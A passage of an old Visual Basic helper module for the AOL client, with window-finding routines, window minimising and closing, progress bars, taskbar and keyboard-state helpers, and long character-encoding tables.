    If UCase(Mid(GetClass(Firs%), 1, Len(childhand))) Like UCase(childhand) Then GoTo Found
    While Firs%
        Firs% = GetWindow(parentw, 5)
        If UCase(Mid(GetClass(Firs%), 1, Len(childhand))) Like UCase(childhand) Then GoTo Found
        Firs% = GetWindow(Firs%, 2)
        If UCase(Mid(GetClass(Firs%), 1, Len(childhand))) Like UCase(childhand) Then GoTo Found
    Wend
    Find2ndChildByClass = 0
Found:
    Firs% = GetWindow(Firs%, 2)
    If UCase(Mid(GetClass(Firs%), 1, Len(childhand))) Like UCase(childhand) Then GoTo Found2
    Firs% = GetWindow(Firs%, 2)
    If UCase(Mid(GetClass(Firs%), 1, Len(childhand))) Like UCase(childhand) Then GoTo Found2
    While Firs%
        Firs% = GetWindow(Firs%, 2)
        If UCase(Mid(GetClass(Firs%), 1, Len(childhand))) Like UCase(childhand) Then GoTo Found2
        Firs% = GetWindow(Firs%, 2)
        If UCase(Mid(GetClass(Firs%), 1, Len(childhand))) Like UCase(childhand) Then GoTo Found2
    Wend
    Find2ndChildByClass = 0
Found2:
    Find2ndChildByClass = Firs%
End Function
Function SetWallpaper(sFileName As String) As Long
SetWallpaper = SystemParametersInfo(SPI_SETDESKWALLPAPER, 0&, sFileName, SPIF_UPDATEINIFILE Or SPIF_SENDWININICHANGE)
End Function
Sub MinToAOL(FormName As Form)
Dim A As Variant
Dim B As Variant
Dim c As Variant
AOL% = FindWindow("AOL Frame25", vbNullString)
AOTooL% = FindChildByClass(AOL%, "AOL Toolbar")
aotool2% = FindChildByClass(AOTooL%, "_AOL_Toolbar")
AOIcon% = FindChildByClass(AOTooL%, "_AOL_Icon")
A = FindWindow("AOL Frame25", vbNullString)
B = FindChildByClass(A, "MDICLIENT")
c = SetParent(FormName.hwnd, AOL%)
l = Screen.Width
J = Screen.Height
FormName.Top = 40
FormName.Left = 100300
End Sub
Sub MinimizeIMs()
im% = FindChildByTitle(AOLMDI, ">Instant Message From: *")
IM2% = FindChildByTitle(AOLMDI, "  Instant Message From: *")
Window_Minimize (im%)
timeout (1)
Window_Minimize (IM2%)
timeout (1)
End Sub
Function Percent(Complete As Integer, Total As Variant, TotalOutput As Integer) As Integer
On Error Resume Next
Percent = Int(Complete / Total * TotalOutput)
End Function
Sub PercentBar(Shape As Control, Done As Integer, Total As Variant)
'Call PercentBar(Picture1, Label1.Caption, Label2.Caption)
On Error Resume Next
Shape.AutoRedraw = True
Shape.FillStyle = 0
Shape.DrawStyle = 0
Shape.FontName = "MS Sans Serif"
Shape.FontSize = 8.25
Shape.FontBold = False
X = Done / Total * Shape.Width
Shape.Line (0, 0)-(Shape.Width, Shape.Height), RGB(0, 0, 0), BF
Shape.Line (0, 0)-(X - 10, Shape.Height), RGB(255, 255, 0), BF
Shape.CurrentX = (Shape.Width / 2) - 100
Shape.CurrentY = (Shape.Height / 2) - 125
End Sub
Sub PercentBar2(Shape As Picturebox, Done As Integer, Total As Variant)
On Error Resume Next
Shape.AutoRedraw = True
X = Done / Total * Shape.Width
BitBlt Form1.Picture1.hdc, X - 10, Shape.Height, Form1.Picture11.Width, Form1.Picture11.Height, Picture11.hdc, 0, 0, SRCCOPY
BitBlt Shape.hdc, X - 10, Shape.Height, Form1.Picture11.Width, Form1.Picture11.Height, Form1.Picture11.hdc, 0, 0, SRCCOPY
Shape.CurrentX = (Shape.Width / 2) - 100
Shape.CurrentY = (Shape.Height / 2) - 125
Shape.Refresh
End Sub
Sub ProgressBar(pb As Control, ByVal Percent)
' example:  call ProgressBar(form1.picture1,33)
Dim num$
If Not pb.AutoRedraw Then
    pb.AutoRedraw = -1
    End If
    pb.Cls
    pb.ScaleWidth = 100
    pb.DrawMode = 10
    num$ = Format$(Percent, "###") + "%"
    pb.CurrentX = 50 - pb.TextWidth(num$) / 2
    pb.CurrentY = (pb.ScaleHeight - pb.TextHeight(num$)) / 2
    pb.Print num$
    pb.Line (0, 0)-(Percent, pb.ScaleHeight), , BF
    pb.Refresh
End Sub
Sub KillConnectionLog()
X% = FindChildByTitle(AOLMDI, "Connection Log")
KillWin X%
End Sub
Sub KillSuperTunnel()
X% = FindChildByTitle(AOLMDI, "PPP information")
Call ShowWindow(X%, SW_HIDE)
End Sub
Sub SetNumlock(Value As Boolean)
Call SetKeyState(vbKeyNumlock, Value)
End Sub
Sub SetScrollLock(Value As Boolean)
Call SetKeyState(vbKeyScrollLock, Value)
End Sub
Sub SetMousePos(X As Long, Y As Long)
SetCursorPos X, Y
End Sub
Function FindChildByTitlePartial(parentw, childhand)
'finds a child windows by part of its title
Firs% = GetWindow(parentw, 5)
If UCase(GetCaption(Firs%)) Like UCase(childhand) Then GoTo bone
Firs% = GetWindow(parentw, GW_CHILD)
While Firs%
Firss% = GetWindow(parentw, 5)
If UCase(GetCaption(Firss%)) Like UCase(childhand) & "*" Then GoTo bone
Firs% = GetWindow(Firs%, 2)
If UCase(GetCaption(Firs%)) Like UCase(childhand) & "*" Then GoTo bone
Wend
FindChildByTitlePartial = 0
bone:
Room% = Firs%
FindChildByTitlePartial = Room%
End Function
Function SecToMin(sec!)
    hrHour! = Fix(sec! / 3600)
    hrRemSec! = sec! - (hrHour! * 3600)
    hrMinute! = Fix(hrRemSec! / 60)
    hrSecond! = hrRemSec! - (hrMinute! * 60)
    timeCalc$ = Format(hrHour!, "00:") & Format(hrMinute!, "00:") & Format(hrSecond!, "00")
    SecToMin = timeCalc$
End Function
Sub OpenTxtFile(file As String, Text As TextBox)
Dim FileLength
Open "" + file + ".txt" For Input As #1
FileLength = LOF(1)
var1 = Input(FileLength, #1)
Text.Text = var1
Close #1
End Sub
Sub FileCopy(source As String, Destination As String)
Call FileCopy(source, Destination)
End Sub
Sub WindowsBootMode()
Select Case GetSystemMetrics(SM_CLEANBOOT)
Case 1: MsgBox "Windows is running in Safe Mode."
Case 2: MsgBox "Windows is running in Safe Mode with Network support."
Case Else: MsgBox "Windows is running normally."
End Select
End Sub
Sub DisableXonForm(beer)
'must copy following code to form_load,will not work simply as the line above
Dim systemmenu%
Dim res%
systemmenu% = GetSystemMenu(beer, 0)
res% = RemoveMenu(systemmenu%, 6, MF_BYPOSITION)
End Sub
Sub EnableXonForm(beer)
'must copy following code to form_load,will not work simply as the line above
Dim systemmenu%
Dim res%
systemmenu% = GetSystemMenu(beer, 1)
res% = RemoveMenu(systemmenu%, 6, MF_BYPOSITION)
End Sub
Public Sub HideTaskBar()
    TaskBarhWnd = FindWindow("Shell_traywnd", "")
    If TaskBarhWnd <> 0 Then
       Call SetWindowPos(TaskBarhWnd, 0, 0, 0, 0, 0, SWP_HIDEWINDOW)
    End If
End Sub
Public Sub ShowTaskBar()
  TaskBarhWnd = FindWindow("Shell_traywnd", "")
    If TaskBarhWnd <> 1 Then
       Call SetWindowPos(TaskBarhWnd, 0, 0, 0, 0, 0, SWP_SHOWWINDOW)
    End If
End Sub
Function UntilWindowClass(parentw, childhand)
GoBack:
DoEvents
Firs% = GetWindow(parentw, 5)
If UCase(Mid(GetClass(Firs%), 1, Len(childhand))) Like UCase(childhand) Then GoTo bone
Firs% = GetWindow(parentw, GW_CHILD)
If UCase(Mid(GetClass(Firs%), 1, Len(childhand))) Like UCase(childhand) Then GoTo bone
While Firs%
Firss% = GetWindow(parentw, 5)
If UCase(Mid(GetClass(Firss%), 1, Len(childhand))) Like UCase(childhand) Then GoTo bone
Firs% = GetWindow(Firs%, 2)
If UCase(Mid(GetClass(Firs%), 1, Len(childhand))) Like UCase(childhand) Then GoTo bone
Wend
GoTo GoBack
FindClassLike = 0
bone:
Room% = Firs%
UntilWindowClass = Room%
End Function
Function UntilWindowTitle(parentw, childhand)
GoBac:
DoEvents
Firs% = GetWindow(parentw, 5)
If UCase(GetCaption(Firs%)) Like UCase(childhand) Then GoTo bone
Firs% = GetWindow(parentw, GW_CHILD)
While Firs%
Firss% = GetWindow(parentw, 5)
If UCase(GetCaption(Firss%)) Like UCase(childhand) Then GoTo bone
Firs% = GetWindow(Firs%, 2)
If UCase(GetCaption(Firs%)) Like UCase(childhand) Then GoTo bone
Wend
GoTo GoBac
FindWindowLike = 0
bone:
Room% = Firs%
UntilWindowTitle = Room%
End Function
Function GetAsciiValues(strin As String)
Let inptxt$ = strin
Let lenth% = Len(inptxt$)
Do While NumSpc% <= lenth%
Let NumSpc% = NumSpc% + 1
Let NextChr$ = Mid$(inptxt$, NumSpc%, 1)
If NextChr$ = " " Then Let NextChr$ = "%20"
If NextChr$ = "¨" Then Let NextChr$ = "%A8"
If NextChr$ = "´" Then Let NextChr$ = "%B4"
If NextChr$ = "¯" Then Let NextChr$ = "%AF"
If NextChr$ = "¸" Then Let NextChr$ = "%B8"
If NextChr$ = "µ" Then Let NextChr$ = "%B5"
If NextChr$ = "¼" Then Let NextChr$ = "%BC"
If NextChr$ = "½" Then Let NextChr$ = "%BD"
If NextChr$ = "¾" Then Let NextChr$ = "%BE"
If NextChr$ = "0" Then Let NextChr$ = "0"
If NextChr$ = "1" Then Let NextChr$ = "1"
If NextChr$ = "2" Then Let NextChr$ = "2"
If NextChr$ = "3" Then Let NextChr$ = "3"
If NextChr$ = "4" Then Let NextChr$ = "4"
If NextChr$ = "5" Then Let NextChr$ = "5"
If NextChr$ = "6" Then Let NextChr$ = "6"
If NextChr$ = "7" Then Let NextChr$ = "7"
If NextChr$ = "8" Then Let NextChr$ = "8"
If NextChr$ = "9" Then Let NextChr$ = "9"
If NextChr$ = "a" Then Let NextChr$ = "a"
If NextChr$ = "b" Then Let NextChr$ = "b"
If NextChr$ = "c" Then Let NextChr$ = "c"
If NextChr$ = "d" Then Let NextChr$ = "d"
If NextChr$ = "e" Then Let NextChr$ = "e"
If NextChr$ = "f" Then Let NextChr$ = "f"
If NextChr$ = "g" Then Let NextChr$ = "g"
If NextChr$ = "h" Then Let NextChr$ = "h"
If NextChr$ = "i" Then Let NextChr$ = "i"
If NextChr$ = "j" Then Let NextChr$ = "j"
If NextChr$ = "k" Then Let NextChr$ = "k"
If NextChr$ = "l" Then Let NextChr$ = "l"
If NextChr$ = "m" Then Let NextChr$ = "m"
If NextChr$ = "n" Then Let NextChr$ = "n"
If NextChr$ = "o" Then Let NextChr$ = "o"
If NextChr$ = "p" Then Let NextChr$ = "p"
If NextChr$ = "q" Then Let NextChr$ = "q"
If NextChr$ = "r" Then Let NextChr$ = "r"
If NextChr$ = "s" Then Let NextChr$ = "s"
If NextChr$ = "t" Then Let NextChr$ = "t"
If NextChr$ = "u" Then Let NextChr$ = "u"
If NextChr$ = "v" Then Let NextChr$ = "v"
If NextChr$ = "w" Then Let NextChr$ = "w"
If NextChr$ = "x" Then Let NextChr$ = "x"
If NextChr$ = "y" Then Let NextChr$ = "y"
If NextChr$ = "z" Then Let NextChr$ = "z"
If NextChr$ = "A" Then Let NextChr$ = "A"
If NextChr$ = "B" Then Let NextChr$ = "B"
If NextChr$ = "C" Then Let NextChr$ = "C"
If NextChr$ = "D" Then Let NextChr$ = "D"
If NextChr$ = "E" Then Let NextChr$ = "E"
If NextChr$ = "F" Then Let NextChr$ = "F"
If NextChr$ = "G" Then Let NextChr$ = "G"
If NextChr$ = "H" Then Let NextChr$ = "H"
If NextChr$ = "I" Then Let NextChr$ = "I"
If NextChr$ = "J" Then Let NextChr$ = "J"
If NextChr$ = "K" Then Let NextChr$ = "K"
If NextChr$ = "L" Then Let NextChr$ = "L"
If NextChr$ = "M" Then Let NextChr$ = "M"
If NextChr$ = "N" Then Let NextChr$ = "N"
If NextChr$ = "O" Then Let NextChr$ = "O"
If NextChr$ = "P" Then Let NextChr$ = "P"
If NextChr$ = "Q" Then Let NextChr$ = "Q"
If NextChr$ = "R" Then Let NextChr$ = "R"
If NextChr$ = "S" Then Let NextChr$ = "S"
If NextChr$ = "T" Then Let NextChr$ = "T"
If NextChr$ = "U" Then Let NextChr$ = "U"
If NextChr$ = "V" Then Let NextChr$ = "V"
If NextChr$ = "W" Then Let NextChr$ = "W"
If NextChr$ = "X" Then Let NextChr$ = "X"
If NextChr$ = "Y" Then Let NextChr$ = "Y"
If NextChr$ = "Z" Then Let NextChr$ = "Z"
If NextChr$ = "ª" Then Let NextChr$ = "%AA"
If NextChr$ = "á" Then Let NextChr$ = "%E1"
If NextChr$ = "Á" Then Let NextChr$ = "%C1"
If NextChr$ = "à" Then Let NextChr$ = "%E0"
If NextChr$ = "À" Then Let NextChr$ = "%C0"
If NextChr$ = "â" Then Let NextChr$ = "%E2"
If NextChr$ = "Â" Then Let NextChr$ = "%C2"
If NextChr$ = "ä" Then Let NextChr$ = "%E4"
If NextChr$ = "Ä" Then Let NextChr$ = "%C4"
If NextChr$ = "ã" Then Let NextChr$ = "%E3"
If NextChr$ = "Ã" Then Let NextChr$ = "%C3"
If NextChr$ = "Å" Then Let NextChr$ = "%C5"
If NextChr$ = "æ" Then Let NextChr$ = "%E6"
If NextChr$ = "Æ" Then Let NextChr$ = "%C6"
If NextChr$ = "ç" Then Let NextChr$ = "%E7"
If NextChr$ = "Ç" Then Let NextChr$ = "%C7"
If NextChr$ = "ð" Then Let NextChr$ = "%F0"
If NextChr$ = "Ð" Then Let NextChr$ = "%D0"
If NextChr$ = "é" Then Let NextChr$ = "%E9"
If NextChr$ = "É" Then Let NextChr$ = "%C9"
If NextChr$ = "è" Then Let NextChr$ = "%E8"
If NextChr$ = "ê" Then Let NextChr$ = "%EA"
If NextChr$ = "È" Then Let NextChr$ = "%C8"
If NextChr$ = "ê" Then Let NextChr$ = "%EA"
If NextChr$ = "ë" Then Let NextChr$ = "%EB"
If NextChr$ = "Ê" Then Let NextChr$ = "%CA"
If NextChr$ = "Ë" Then Let NextChr$ = "%CB"
If NextChr$ = "í" Then Let NextChr$ = "%ED"
If NextChr$ = "ì" Then Let NextChr$ = "%EC"
If NextChr$ = "Í" Then Let NextChr$ = "%CD"
If NextChr$ = "Ì" Then Let NextChr$ = "%CC"
If NextChr$ = "î" Then Let NextChr$ = "%EE"
If NextChr$ = "ï" Then Let NextChr$ = "%EF"
If NextChr$ = "Ï" Then Let NextChr$ = "%CF"
If NextChr$ = "ñ" Then Let NextChr$ = "%F1"
If NextChr$ = "Ñ" Then Let NextChr$ = "%D1"
If NextChr$ = "º" Then Let NextChr$ = "%BA"
If NextChr$ = "ó" Then Let NextChr$ = "%F3"
If NextChr$ = "Ó" Then Let NextChr$ = "%D3"
If NextChr$ = "Ò" Then Let NextChr$ = "%D2"
If NextChr$ = "ò" Then Let NextChr$ = "%F2"
If NextChr$ = "ô" Then Let NextChr$ = "%F4"
If NextChr$ = "Ô" Then Let NextChr$ = "%D4"
If NextChr$ = "Ö" Then Let NextChr$ = "%D6"
If NextChr$ = "ö" Then Let NextChr$ = "%F6"
If NextChr$ = "Õ" Then Let NextChr$ = "%D5"
If NextChr$ = "ø" Then Let NextChr$ = "%F8"
If NextChr$ = "Ø" Then Let NextChr$ = "%D8"
If NextChr$ = "ß" Then Let NextChr$ = "%DF"
If NextChr$ = "þ" Then Let NextChr$ = "%FE"
If NextChr$ = "Þ" Then Let NextChr$ = "%DE"
If NextChr$ = "ú" Then Let NextChr$ = "%FA"
If NextChr$ = "Ú" Then Let NextChr$ = "%DA"
If NextChr$ = "ù" Then Let NextChr$ = "%F9"
If NextChr$ = "Ù" Then Let NextChr$ = "%D9"
If NextChr$ = "û" Then Let NextChr$ = "%FB"
If NextChr$ = "Û" Then Let NextChr$ = "%DB"
If NextChr$ = "ü" Then Let NextChr$ = "%FC"
If NextChr$ = "Ü" Then Let NextChr$ = "%DC"
If NextChr$ = "ý" Then Let NextChr$ = "%FD"
If NextChr$ = "ÿ" Then Let NextChr$ = "%FF"
If NextChr$ = "Ý" Then Let NextChr$ = "%DD"
Let newsent$ = newsent$ + NextChr$
Loop
   lenth2% = Len(newsent$)
        Do While numspca% <= lenth2% - 1
           Let numspca% = numspca% + 1
           Let nextchra$ = Mid$(newsent$, numspca%, 1)
           Let newsenta$ = newsenta$ + nextchra$
         Loop
newsenta$ = newsenta$
GetAsciiValues = newsenta$
End Function
Function GetChrValues(strin As String)
'chr(8) = backspace
'chr(9) = tab
'chr(10)= linefeed
'chr(13)= return
Let inptxt$ = strin
Let lenth% = Len(inptxt$)
Do While NumSpc% <= lenth%
Let NumSpc% = NumSpc% + 1
Let NextChr$ = Mid$(inptxt$, NumSpc%, 1)
If NextChr$ = " " Then Let NextChr$ = "chr(32)"
If NextChr$ = "!" Then Let NextChr$ = "chr(33)"
If NextChr$ = """" Then Let NextChr$ = "chr(34)"
If NextChr$ = "#" Then Let NextChr$ = "chr(35)"
If NextChr$ = "$" Then Let NextChr$ = "chr(36)"
If NextChr$ = "%" Then Let NextChr$ = "chr(37)"
If NextChr$ = "&" Then Let NextChr$ = "chr(38)"
If NextChr$ = "'" Then Let NextChr$ = "chr(39)"
If NextChr$ = "(" Then Let NextChr$ = "chr(40)"
If NextChr$ = ")" Then Let NextChr$ = "chr(41)"
If NextChr$ = "*" Then Let NextChr$ = "chr(42)"
If NextChr$ = "+" Then Let NextChr$ = "chr(43)"
If NextChr$ = "," Then Let NextChr$ = "chr(44)"
If NextChr$ = "-" Then Let NextChr$ = "chr(45)"
If NextChr$ = "." Then Let NextChr$ = "chr(46)"
If NextChr$ = "/" Then Let NextChr$ = "chr(47)"
If NextChr$ = "0" Then Let NextChr$ = "chr(48)"
If NextChr$ = "1" Then Let NextChr$ = "chr(49)"
If NextChr$ = "2" Then Let NextChr$ = "chr(50)"
If NextChr$ = "3" Then Let NextChr$ = "chr(51)"
If NextChr$ = "4" Then Let NextChr$ = "chr(52)"
If NextChr$ = "5" Then Let NextChr$ = "chr(53)"
If NextChr$ = "6" Then Let NextChr$ = "chr(54)"
If NextChr$ = "7" Then Let NextChr$ = "chr(55)"
If NextChr$ = "8" Then Let NextChr$ = "chr(56)"
If NextChr$ = "9" Then Let NextChr$ = "chr(57)"
If NextChr$ = ":" Then Let NextChr$ = "chr(58)"
If NextChr$ = ";" Then Let NextChr$ = "chr(59)"
If NextChr$ = "<" Then Let NextChr$ = "chr(60)"
If NextChr$ = "=" Then Let NextChr$ = "chr(61)"
If NextChr$ = ">" Then Let NextChr$ = "chr(62)"
If NextChr$ = "?" Then Let NextChr$ = "chr(63)"
If NextChr$ = "@" Then Let NextChr$ = "chr(64)"
If NextChr$ = "A" Then Let NextChr$ = "chr(65)"
If NextChr$ = "B" Then Let NextChr$ = "chr(66)"
If NextChr$ = "C" Then Let NextChr$ = "chr(67)"
If NextChr$ = "D" Then Let NextChr$ = "chr(68)"
If NextChr$ = "E" Then Let NextChr$ = "chr(69)"
If NextChr$ = "F" Then Let NextChr$ = "chr(70)"
If NextChr$ = "G" Then Let NextChr$ = "chr(71)"
If NextChr$ = "H" Then Let NextChr$ = "chr(72)"
If NextChr$ = "I" Then Let NextChr$ = "chr(73)"
If NextChr$ = "J" Then Let NextChr$ = "chr(74)"
If NextChr$ = "K" Then Let NextChr$ = "chr(75)"
If NextChr$ = "L" Then Let NextChr$ = "chr(76)"
If NextChr$ = "M" Then Let NextChr$ = "chr(77)"
If NextChr$ = "N" Then Let NextChr$ = "chr(78)"
If NextChr$ = "O" Then Let NextChr$ = "chr(79)"
If NextChr$ = "P" Then Let NextChr$ = "chr(80)"
If NextChr$ = "Q" Then Let NextChr$ = "chr(81)"
If NextChr$ = "R" Then Let NextChr$ = "chr(82)"
If NextChr$ = "S" Then Let NextChr$ = "chr(83)"
If NextChr$ = "T" Then Let NextChr$ = "chr(84)"
If NextChr$ = "U" Then Let NextChr$ = "chr(85)"
If NextChr$ = "V" Then Let NextChr$ = "chr(86)"
If NextChr$ = "W" Then Let NextChr$ = "chr(87)"
If NextChr$ = "X" Then Let NextChr$ = "chr(88)"
If NextChr$ = "Y" Then Let NextChr$ = "chr(89)"
If NextChr$ = "Z" Then Let NextChr$ = "chr(90)"
If NextChr$ = "[" Then Let NextChr$ = "chr(91)"
If NextChr$ = "\" Then Let NextChr$ = "chr(92)"
If NextChr$ = "]" Then Let NextChr$ = "chr(93)"
If NextChr$ = "^" Then Let NextChr$ = "chr(94)"
If NextChr$ = "_" Then Let NextChr$ = "chr(95)"
If NextChr$ = "`" Then Let NextChr$ = "chr(96)"
If NextChr$ = "a" Then Let NextChr$ = "chr(97)"
If NextChr$ = "b" Then Let NextChr$ = "chr(98)"
If NextChr$ = "c" Then Let NextChr$ = "chr(99)"
If NextChr$ = "d" Then Let NextChr$ = "chr(100)"
If NextChr$ = "e" Then Let NextChr$ = "chr(101)"
If NextChr$ = "f" Then Let NextChr$ = "chr(102)"
If NextChr$ = "g" Then Let NextChr$ = "chr(103)"
If NextChr$ = "h" Then Let NextChr$ = "chr(104)"
If NextChr$ = "i" Then Let NextChr$ = "chr(105)"
If NextChr$ = "j" Then Let NextChr$ = "chr(106)"
If NextChr$ = "k" Then Let NextChr$ = "chr(107)"
If NextChr$ = "l" Then Let NextChr$ = "chr(108)"
If NextChr$ = "m" Then Let NextChr$ = "chr(109)"
If NextChr$ = "n" Then Let NextChr$ = "chr(110)"
If NextChr$ = "o" Then Let NextChr$ = "chr(111)"
If NextChr$ = "p" Then Let NextChr$ = "chr(112)"
If NextChr$ = "q" Then Let NextChr$ = "chr(113)"
If NextChr$ = "r" Then Let NextChr$ = "chr(114)"
If NextChr$ = "s" Then Let NextChr$ = "chr(115)"
If NextChr$ = "t" Then Let NextChr$ = "chr(116)"
If NextChr$ = "u" Then Let NextChr$ = "chr(117)"
If NextChr$ = "v" Then Let NextChr$ = "chr(118)"
If NextChr$ = "w" Then Let NextChr$ = "chr(119)"
If NextChr$ = "x" Then Let NextChr$ = "chr(120)"
If NextChr$ = "y" Then Let NextChr$ = "chr(121)"
If NextChr$ = "z" Then Let NextChr$ = "chr(122)"
If NextChr$ = "{" Then Let NextChr$ = "chr(123)"
If NextChr$ = "|" Then Let NextChr$ = "chr(124)"
If NextChr$ = "}" Then Let NextChr$ = "chr(125)"
If NextChr$ = "~" Then Let NextChr$ = "chr(126)"
'chr(127) through chr(144)
'are not supported by windows
If NextChr$ = "‘" Then Let NextChr$ = "chr(145)"
If NextChr$ = "‘" Then Let NextChr$ = "chr(146)"
'chr(147) through chr(159)
'are not supported by windows
If NextChr$ = " " Then Let NextChr$ = "chr(160)"
If NextChr$ = "¡" Then Let NextChr$ = "chr(161)"
If NextChr$ = "¢" Then Let NextChr$ = "chr(162)"
If NextChr$ = "£" Then Let NextChr$ = "chr(163)"
If NextChr$ = "¤" Then Let NextChr$ = "chr(164)"
If NextChr$ = "¥" Then Let NextChr$ = "chr(165)"
If NextChr$ = "¦" Then Let NextChr$ = "chr(166)"
If NextChr$ = "§" Then Let NextChr$ = "chr(167)"
If NextChr$ = "¨" Then Let NextChr$ = "chr(168)"
If NextChr$ = "©" Then Let NextChr$ = "chr(169)"
If NextChr$ = "ª" Then Let NextChr$ = "chr(170)"
If NextChr$ = "«" Then Let NextChr$ = "chr(171)"
If NextChr$ = "¬" Then Let NextChr$ = "chr(172)"
If NextChr$ = "­" Then Let NextChr$ = "chr(173)"
If NextChr$ = "®" Then Let NextChr$ = "chr(174)"
If NextChr$ = "¯" Then Let NextChr$ = "chr(175)"
If NextChr$ = "°" Then Let NextChr$ = "chr(176)"
If NextChr$ = "±" Then Let NextChr$ = "chr(177)"
If NextChr$ = "²" Then Let NextChr$ = "chr(178)"
If NextChr$ = "³" Then Let NextChr$ = "chr(179)"
If NextChr$ = "´" Then Let NextChr$ = "chr(180)"
If NextChr$ = "µ" Then Let NextChr$ = "chr(181)"
If NextChr$ = "¶" Then Let NextChr$ = "chr(182)"
If NextChr$ = "·" Then Let NextChr$ = "chr(183)"
If NextChr$ = "¸" Then Let NextChr$ = "chr(184)"
If NextChr$ = "¹" Then Let NextChr$ = "chr(185)"
If NextChr$ = "º" Then Let NextChr$ = "chr(186)"
If NextChr$ = "»" Then Let NextChr$ = "chr(187)"
If NextChr$ = "¼" Then Let NextChr$ = "chr(188)"
If NextChr$ = "½" Then Let NextChr$ = "chr(189)"
If NextChr$ = "¾" Then Let NextChr$ = "chr(190)"
If NextChr$ = "¿" Then Let NextChr$ = "chr(191)"
If NextChr$ = "À" Then Let NextChr$ = "chr(192)"
If NextChr$ = "Á" Then Let NextChr$ = "chr(193)"
If NextChr$ = "Â" Then Let NextChr$ = "chr(194)"
If NextChr$ = "Ã" Then Let NextChr$ = "chr(195)"
If NextChr$ = "Ä" Then Let NextChr$ = "chr(196)"
If NextChr$ = "Å" Then Let NextChr$ = "chr(197)"
If NextChr$ = "Æ" Then Let NextChr$ = "chr(198)"
If NextChr$ = "Ç" Then Let NextChr$ = "chr(199)"
If NextChr$ = "È" Then Let NextChr$ = "chr(200)"
If NextChr$ = "É" Then Let NextChr$ = "chr(201)"
If NextChr$ = "Ê" Then Let NextChr$ = "chr(202)"
If NextChr$ = "Ë" Then Let NextChr$ = "chr(203)"
If NextChr$ = "Ì" Then Let NextChr$ = "chr(204)"
If NextChr$ = "Í" Then Let NextChr$ = "chr(205)"
If NextChr$ = "Î" Then Let NextChr$ = "chr(206)"
If NextChr$ = "Ï" Then Let NextChr$ = "chr(207)"
If NextChr$ = "Ð" Then Let NextChr$ = "chr(208)"
If NextChr$ = "Ñ" Then Let NextChr$ = "chr(209)"
If NextChr$ = "Ò" Then Let NextChr$ = "chr(210)"
If NextChr$ = "Ó" Then Let NextChr$ = "chr(211)"
If NextChr$ = "Ô" Then Let NextChr$ = "chr(212)"
If NextChr$ = "Õ" Then Let NextChr$ = "chr(213)"
If NextChr$ = "Ö" Then Let NextChr$ = "chr(214)"
If NextChr$ = "×" Then Let NextChr$ = "chr(215)"
If NextChr$ = "Ø" Then Let NextChr$ = "chr(216)"
If NextChr$ = "Ù" Then Let NextChr$ = "chr(217)"
If NextChr$ = "Ú" Then Let NextChr$ = "chr(218)"
If NextChr$ = "Û" Then Let NextChr$ = "chr(219)"
If NextChr$ = "Ü" Then Let NextChr$ = "chr(220)"
If NextChr$ = "Ý" Then Let NextChr$ = "chr(221)"
If NextChr$ = "Þ" Then Let NextChr$ = "chr(222)"
If NextChr$ = "ß" Then Let NextChr$ = "chr(223)"
If NextChr$ = "à" Then Let NextChr$ = "chr(224)"
If NextChr$ = "á" Then Let NextChr$ = "chr(225)"
If NextChr$ = "â" Then Let NextChr$ = "chr(226)"
If NextChr$ = "ã" Then Let NextChr$ = "chr(227)"
If NextChr$ = "ä" Then Let NextChr$ = "chr(228)"
If NextChr$ = "å" Then Let NextChr$ = "chr(229)"
If NextChr$ = "æ" Then Let NextChr$ = "chr(230)"
If NextChr$ = "ç" Then Let NextChr$ = "chr(231)"
If NextChr$ = "è" Then Let NextChr$ = "chr(232)"
If NextChr$ = "é" Then Let NextChr$ = "chr(233)"
If NextChr$ = "ê" Then Let NextChr$ = "chr(234)"
If NextChr$ = "ë" Then Let NextChr$ = "chr(235)"
If NextChr$ = "ì" Then Let NextChr$ = "chr(236)"
If NextChr$ = "í" Then Let NextChr$ = "chr(237)"
If NextChr$ = "î" Then Let NextChr$ = "chr(238)"
If NextChr$ = "ï" Then Let NextChr$ = "chr(239)"
If NextChr$ = "ð" Then Let NextChr$ = "chr(240)"
If NextChr$ = "ñ" Then Let NextChr$ = "chr(241)"
If NextChr$ = "ò" Then Let NextChr$ = "chr(242)"
If NextChr$ = "ó" Then Let NextChr$ = "chr(243)"
If NextChr$ = "ô" Then Let NextChr$ = "chr(244)"
If NextChr$ = "õ" Then Let NextChr$ = "chr(245)"
If NextChr$ = "ö" Then Let NextChr$ = "chr(246)"
If NextChr$ = "÷" Then Let NextChr$ = "chr(247)"
If NextChr$ = "ø" Then Let NextChr$ = "chr(248)"
If NextChr$ = "ù" Then Let NextChr$ = "chr(249)"
If NextChr$ = "ú" Then Let NextChr$ = "chr(250)"
If NextChr$ = "û" Then Let NextChr$ = "chr(251)"
If NextChr$ = "ü" Then Let NextChr$ = "chr(252)"
If NextChr$ = "ý" Then Let NextChr$ = "chr(253)"
If NextChr$ = "þ" Then Let NextChr$ = "chr(254)"
If NextChr$ = "ÿ" Then Let NextChr$ = "chr(255)"
Let newsent$ = newsent$ + NextChr$
Loop
   lenth2% = Len(newsent$)
        Do While numspca% <= lenth2% - 2
           Let numspca% = numspca% + 1
           Let nextchra$ = Mid$(newsent$, numspca%, 1)
               If nextchra$ = ")" Then Let nextchra$ = ")&"
                  Let newsenta$ = newsenta$ + nextchra$
         Loop
'adds the last )
newsenta$ = newsenta$ + ")"
'sends the chr code
GetChrValues = newsenta$
End Function
Function centerstring(before$) As String
'centers a string
    lenstr% = twiplen(before$)
    leftlen% = 6500 - lenstr%
    blanklen% = leftlen% / 2
    numblank% = Int(blanklen% / 85)
    blank$ = ""
    For ctr% = 1 To numblank%
        blank$ = blank$ & " "
    Next ctr%
   centerstring = blank$ & before$
End Function
Function twiplen(teststring$) As Integer
'this function is used for for centerstring()
Dim twips As Integer
Dim lenstr As Integer
Dim char As String * 1
Dim charasc As Integer
    lenstr% = Len(teststring$)
     For ctr% = 1 To lenstr%
        char$ = Mid$(teststring$, ctr%, 1)
        charasc% = Asc(char$)
        Select Case charasc%
            Case 32: twips% = twips% + 85
            Case 33: twips% = twips% + 64
            Case 34: twips% = twips% + 106
            Case 35: twips% = twips% + 151
            Case 36: twips% = twips% + 149
            Case 37: twips% = twips% + 261
            Case 38: twips% = twips% + 195
            Case 39: twips% = twips% + 43
            Case 40: twips% = twips% + 85
            Case 41: twips% = twips% + 85
            Case 42: twips% = twips% + 104
            Case 43: twips% = twips% + 172
            Case 44: twips% = twips% + 85
            Case 45: twips% = twips% + 85
            Case 46: twips% = twips% + 85
            Case 47: twips% = twips% + 85
            Case 48: twips% = twips% + 151
            Case 49: twips% = twips% + 151
